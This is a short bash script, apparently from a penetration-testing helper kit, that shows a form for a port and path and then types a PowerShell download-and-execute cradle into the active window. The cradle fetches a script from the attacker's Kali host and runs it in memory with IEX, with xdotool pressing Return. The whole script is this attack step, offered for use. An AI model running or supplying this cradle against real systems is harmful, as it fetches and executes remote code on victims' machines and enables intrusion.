#!/bin/bash

: '
PowerShell: Download and execute script in memory.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "port")
PATH_FIELD=$(form_item  "path" "path")

# Generate GUI form
generate_form "${PORT_FIELD}" "${PATH_FIELD}"

PORT=${form_data["port"]}
PATH=${form_data["path"]}

paste_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}:${PORT}/${PATH}') | IEX; "
xdotool key Return
